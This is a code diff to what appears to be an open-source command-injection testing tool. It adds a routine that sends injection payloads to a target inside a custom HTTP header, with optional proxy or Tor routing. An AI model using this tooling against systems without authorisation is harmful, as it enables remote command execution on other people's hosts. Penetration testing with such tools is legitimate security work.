@@ -456,6 +456,90 @@ def referer_injection_test(url, vuln_parameter, payload):
   return response
 
 """
+Check if target host is vulnerable. (Custom header injection)
+"""
+def custom_header_injection_test(url, vuln_parameter, payload):
+
+  def inject_custom_header(url, vuln_parameter, payload, proxy):
+
+    if proxy == None:
+      opener = urllib2.build_opener()
+    else:
+      opener = urllib2.build_opener(proxy)
+
+    request = urllib2.Request(url)
+    #Check if defined extra headers.
+    headers.do_check(request)
+    request.add_header(settings.CUSTOM_HEADER_NAME, urllib.unquote(payload))
+    try:
+      response = opener.open(request)
+      return response
+    except ValueError:
+      pass
+
+  proxy = None 
+  response = inject_custom_header(url, vuln_parameter, payload, proxy)
+  # Check if defined any HTTP Proxy.
+  if menu.options.proxy:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
+      response = inject_custom_header(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      if settings.IGNORE_ERR_MSG == False:
+        print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
+        continue_tests = checks.continue_tests(err)
+        if continue_tests == True:
+          settings.IGNORE_ERR_MSG = True
+        else:
+          raise SystemExit()
+      response = False 
+    except urllib2.URLError, err:
+      if "Connection refused" in err.reason:
+        print "\n" + Back.RED + settings.CRITICAL_SIGN + "The target host is not responding." + \
+              " Please ensure that is up and try again." + Style.RESET_ALL
+      raise SystemExit()
+
+  # Check if defined Tor.
+  elif menu.options.tor:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
+      response = inject_custom_header(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      if settings.IGNORE_ERR_MSG == False:
+        print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
+        continue_tests = checks.continue_tests(err)
+        if continue_tests == True:
+          settings.IGNORE_ERR_MSG = True
+        else:
+          raise SystemExit()
+      response = False 
+    except urllib2.URLError, err:
+      if "Connection refused" in err.reason:
+        print "\n" + Back.RED + settings.CRITICAL_SIGN + "The target host is not responding." + \
+              " Please ensure that is up and try again." + Style.RESET_ALL
+      raise SystemExit()
+
+  else:
+    try:
+      response = inject_custom_header(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      if settings.IGNORE_ERR_MSG == False:
+        print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
+        continue_tests = checks.continue_tests(err)
+        if continue_tests == True:
+          settings.IGNORE_ERR_MSG = True
+        else:
+          raise SystemExit()
+      response = False 
+    except urllib2.URLError, err:
+      if "Connection refused" in err.reason:
+        print "\n" + Back.RED + settings.CRITICAL_SIGN + "The target host is not responding." + \
+              " Please ensure that is up and try again." + Style.RESET_ALL
+      raise SystemExit()
+
+  return response
+
+"""
 The main command injection exploitation.
 """
 def injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename):
@@ -494,6 +578,10 @@ def injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vul
   # Check if defined referer with "INJECT_HERE" tag
   elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
     response = referer_injection_test(url, vuln_parameter, payload)
+
+  # Check if defined custom header with "INJECT_HERE" tag
+  elif settings.CUSTOM_HEADER_INJECTION:
+    response = custom_header_injection_test(url, vuln_parameter, payload)
 
   else:
     # Check if defined method is GET (Default).
